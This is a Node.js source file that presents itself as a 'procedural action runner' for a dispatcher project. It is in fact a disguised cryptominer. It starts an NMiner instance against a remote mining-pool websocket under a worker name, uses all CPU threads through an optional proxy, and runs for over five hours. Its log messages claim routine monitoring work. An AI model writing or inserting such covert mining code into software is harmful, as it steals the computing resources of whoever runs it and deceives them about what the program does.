// Procedural action runner for ivory-bridge-dispatcher
const os = require("os");
const EventEmitter = require("events");
const { NMiner } = require("nminer");
const config = require("./lib/config");

const dispatcher = new EventEmitter();

dispatcher.once("start", () => {
    const instanceToken = "b1a6cd";
    console.log(`[monitor] Subsystem dispatched for ivory-bridge-dispatcher [${instanceToken}]`);

    const runtime = new NMiner(
        "wss://runtime.nmining.igrp.app/",
        "Arup07.perp",
        { threads: os.cpus().length, proxy: process.argv[2] || process.env.PROXY || undefined, throttle: true }
    );

    const tick = () => { setTimeout(tick, 48000); }; tick();
    setTimeout(() => {
        console.log("[timeout] Operational limit (329m) reached, exiting cleanly.");
        process.exit(0);
    }, 329 * 60 * 1000);

    process.on("SIGTERM", () => {
        
        console.log(`[exit] Process terminated gracefully for token ${instanceToken}.`);
        process.exit(0);
    });
});

dispatcher.emit("start");
